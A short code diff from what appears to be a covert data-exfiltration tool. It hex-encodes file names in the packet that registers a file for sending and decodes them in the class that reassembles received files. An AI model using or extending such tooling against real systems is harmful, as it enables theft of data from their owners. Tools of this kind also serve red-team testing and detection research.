@@ -220,7 +220,7 @@ class Exfiltration(object):
         if jobid not in files:
             files[jobid] = {}
             files[jobid]['checksum'] = message[3].lower()
-            files[jobid]['filename'] = message[1].lower()
+            files[jobid]['filename'] = bytes.fromhex(message[1]).decode().lower()
             files[jobid]['data'] = []
             files[jobid]['packets_order'] = []
             files[jobid]['packets_len'] = -1
@@ -336,7 +336,7 @@ class ExfiltrateFile(threading.Thread):
 
         warning("[!] Registering packet for the file")
         data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
+            self.jobid, os.path.basename(self.file_to_send).encode().hex(), self.checksum)
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
